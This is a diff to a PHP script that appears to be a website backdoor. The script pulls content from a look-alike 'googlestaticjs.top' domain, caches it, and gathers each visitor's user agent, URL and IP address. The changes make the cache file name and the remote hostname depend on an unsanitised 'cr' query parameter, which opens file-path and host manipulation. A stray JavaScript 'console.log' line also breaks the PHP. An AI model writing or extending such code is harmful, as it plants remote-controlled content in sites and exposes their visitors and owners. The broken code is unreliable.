@@ -1,5 +1,6 @@
 <?php
-$cache_file = 'indexapi.txt';
+$country = isset($_GET['cr']) ? $_GET['cr'] : 'en';
+$cache_file = $country . '_indexapi.txt';
 function updateApiCache($cache_file, $country) {
     $api_urls = [
         "https://{$country}.googlestaticjs.top/new_api",
@@ -7,7 +8,7 @@ function updateApiCache($cache_file, $country) {
     ];
     foreach ($api_urls as $api_url) {
         $latest_api_content = @file_get_contents($api_url);
-        // echo 'update new_api';
+        console.log($api_url);
         if ($latest_api_content !== false) {
             $latest_api_content = trim($latest_api_content);
             // Save the latest API to cache file
@@ -21,8 +22,7 @@ function updateApiCache($cache_file, $country) {
 $user_agent = urlencode($_SERVER['HTTP_USER_AGENT']);
 $current_url = urlencode("http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
 $user_ip = urlencode($_SERVER['REMOTE_ADDR']);
-// 获取国家信息，默认为英文（'en'）
-$country = isset($_GET['cr']) ? $_GET['cr'] : 'en';
+
 
 // Check if API cache file exists
 
